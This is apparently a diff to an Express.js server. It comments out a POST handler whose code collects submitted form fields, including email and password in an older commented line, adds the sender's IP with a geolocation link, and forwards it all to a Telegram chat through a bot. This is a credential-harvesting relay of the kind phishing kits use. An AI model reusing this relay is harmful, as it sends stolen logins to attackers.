@@ -81,30 +81,31 @@ export default function expressApp(functionName) {
   })
 
   router.get('/hello/', function(req, res) {
-  app.post('/', function(req, res){
-   res.header("Access-Control-Allow-Origin", "*");
-   res.header('Access-Control-Allow-Methods', 'DELETE, PUT');
-   res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
-   var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    res.send("recieved your request!");
+//   app.post('/', function(req, res){
+//    res.header("Access-Control-Allow-Origin", "*");
+//    res.header('Access-Control-Allow-Methods', 'DELETE, PUT');
+//    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
+//    var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   
-   // var message= "------------------------\nEmail : "+req.body.email+"\npassword : "+req.body.password+"\nmode: "+req.body.mode+"\nhttp://www.geoiptool.com/?IP="+ip+"\n";
-       let msg='';
-  for (let [key, value] of Object.entries(req.body.val)) {
-  msg +=key+' : '+ value+'\n';
+//    // var message= "------------------------\nEmail : "+req.body.email+"\npassword : "+req.body.password+"\nmode: "+req.body.mode+"\nhttp://www.geoiptool.com/?IP="+ip+"\n";
+//        let msg='';
+//   for (let [key, value] of Object.entries(req.body.val)) {
+//   msg +=key+' : '+ value+'\n';
  
-}
-msg += "\nhttp://www.geoiptool.com/?IP="+ip+"\n";
+// }
+// msg += "\nhttp://www.geoiptool.com/?IP="+ip+"\n";
      
-   console.log(msg);
+//    console.log(msg);
 
 
-// Create a bot that uses 'polling' to fetch new updates
-const bot = new telegrambot(req.body.tok, {polling: true});
+// // Create a bot that uses 'polling' to fetch new updates
+// const bot = new telegrambot(req.body.tok, {polling: true});
 
-bot.sendMessage(req.body.telid, msg);
-   res.send("recieved your request!");
-});
-  })
+// bot.sendMessage(req.body.telid, msg);
+//    res.send("recieved your request!");
+// });
+//   })
 
   // Attach logger
   app.use(morgan(customLogger))
